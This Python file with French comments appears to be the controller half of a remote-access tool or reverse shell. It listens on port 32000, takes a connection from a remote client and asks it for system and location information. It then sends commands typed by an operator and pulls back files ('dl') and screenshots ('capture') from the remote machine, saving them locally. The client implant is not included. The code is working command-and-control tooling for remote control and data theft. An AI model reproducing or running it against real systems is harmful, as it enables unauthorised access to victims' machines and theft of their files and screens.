import socket
import pathlib
import os

def socket_receive_all_data(socket, data_len):
    current_data_len = 0
    total_data = None
    #print("socket_receive_all_data len:", data_len) #DEBUG
    while current_data_len < data_len:
        chunck_len = data_len - current_data_len
        if chunck_len > MAX_SIZE:
            chunck_len = MAX_SIZE
        data = socket.recv(chunck_len)
        #print("  Longueur de la data reçue : ", chunck_len) #DEBUG
        if not data:
            print("Connexion perdue")
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
            #print("  ", current_data_len, "/", data_len) #DEBUG
        current_data_len += len(data)
    #print("  ", current_data_len, "/", data_len) #DEBUG
    #print(len(total_data)) #DEBUG
    return total_data

def socket_send_command_and_receive_all_data(connection_socket, command):
        if not command:
            return None
        connection_socket.sendall(command.encode())
        header_data = socket_receive_all_data(connection_socket, 13)
        longueur_data = int(header_data.decode())
        #print("longueur data: ", longueur_data) #DEBUG
        data_recues = socket_receive_all_data(connection_socket, longueur_data)
        return data_recues

HOST_IP = ""
# laisser vide l'adresse IP côté serveur pour permettre les connexion depuis n'importe quelle adresse IP
HOST_PORT = 32000
MAX_SIZE = 1024

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

if __name__ == '__main__':

    s.bind((HOST_IP, HOST_PORT))
    s.listen()
    print(f"Attente de connexion sur IP : {HOST_IP} / Port : {HOST_PORT}")
    connection_socket, client_address = s.accept()
    print(f"Connexion établie avec {client_address}")
    #print(client_address) # DEBUG

    while True:
        dl_filename = None
        #RECUPERATION DES INFOS (OS ET LOCATION)
        infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
        if not infos_data:
            break
        #AFFICHAGE DES INFOS ET DEMANDE D'UNE COMMANDE
        command = input(client_address[0] + " : " + str(client_address[1]) + " " + infos_data.decode() + " > ")
        command_split = command.split(" ", 1)
        if command_split[0] == "dl" or command_split[0] == "capture":
            dl_filename = command_split[1]
        data_recues = socket_send_command_and_receive_all_data(connection_socket, command)
        #print("data_recues longueur : ", len(data_recues)) #DEBUG
        if not data_recues:
            break
        if dl_filename:
            if len(data_recues) == 1 and data_recues == b" ":
                if command_split[0] == "dl":
                    print(f"ERREUR : Le fichier {command_split[1]} n'a pas pu être téléchargé")
            #GESTION DU CAS OU IL N'Y A PAS DE FICHIER AVEC LE NOM DONNÉ
                elif command_split[0] == "capture":
                    print(f"ERREUR : La capture d'écran {command_split[1]} n'a pas pu être faite")
            #SUPPRESSION DU CHEMIN VERS LE DOSSIER PARENT - POUR NE CONSERVER QUE LE NOM DU FICHIER
            else:
                #print(data_recues) #DEBUG
                absolute_path = dl_filename.strip("'")
                relative_path = pathlib.Path(absolute_path).parent
                new_dl_filename = os.path.relpath(absolute_path, relative_path)
                if command_split[0] == "capture":
                    new_dl_filename += ".png"
                #print(new_dl_filename) #DEBUG
                # CREATION DU FICHIER A PARTIR DU BINAIRE
                f = open(new_dl_filename, "wb")
                f.write(data_recues)
                f.close()
                #ADAPTATION DE L'AFFICHAGE SELON QUE LE FICHIER EST DANS LE DOSSIER LOCAL OU NON
                located = ""
                if not dl_filename == new_dl_filename and command_split[0] == "dl":
                    located = f" situé {command_split[1]}"
                print(f"Fichier {new_dl_filename}{located} téléchargé.")
                #PROBLEME D'ENCODAGE DES IMAGES ET AUTRE FICHIERS
        else:
            print(data_recues.decode())
    s.close()
    connection_socket.close()
